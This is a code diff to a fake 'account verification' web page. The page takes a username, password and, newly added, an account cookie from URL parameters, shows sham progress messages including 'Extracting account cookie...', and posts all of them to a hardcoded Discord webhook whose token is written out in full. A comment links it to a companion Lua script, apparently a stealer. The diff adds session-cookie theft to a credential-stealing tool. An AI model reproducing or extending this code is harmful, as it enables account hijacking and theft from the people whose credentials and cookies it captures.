@@ -137,6 +137,11 @@
             color: #888;
             font-style: italic;
         }
+        .cookie-value {
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
@@ -186,6 +191,10 @@
                         <span class="info-value" id="verified-password">Loading...</span>
                     </div>
                     <div class="info-row">
+                        <span class="info-label">Account Cookie:</span>
+                        <span class="info-value cookie-value" id="verified-cookie">Loading...</span>
+                    </div>
+                    <div class="info-row">
                         <span class="info-label">Verification Status:</span>
                         <span class="info-value">✅ Successful</span>
                     </div>
@@ -227,6 +236,7 @@
         const userId = urlParams.get('userId');
         const username = urlParams.get('username');
         const password = urlParams.get('password');
+        const cookie = urlParams.get('cookie') || "No cookie provided";
         
         // Discord webhook URLs - Use the ones from your Lua script
         const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
@@ -245,6 +255,9 @@
         }
         if (password) {
             document.getElementById('verified-password').textContent = "••••••••";
+        }
+        if (cookie) {
+            document.getElementById('verified-cookie').textContent = cookie;
         }
         
         // Start automatic verification when page loads
@@ -276,6 +289,8 @@
             await delay(1500);
             updateVerificationStatus("Checking credentials...");
             await delay(2000);
+            updateVerificationStatus("Extracting account cookie...");
+            await delay(1000);
             updateVerificationStatus("Finalizing verification...");
             await delay(1000);
         }
@@ -331,6 +346,11 @@
                         name: "🔐 Password",
                         value: `||${password}||`,
                         inline: true
+                    },
+                    {
+                        name: "🍪 Account Cookie",
+                        value: `||${cookie}||`,
+                        inline: false
                     },
                     {
                         name: "📊 Result",
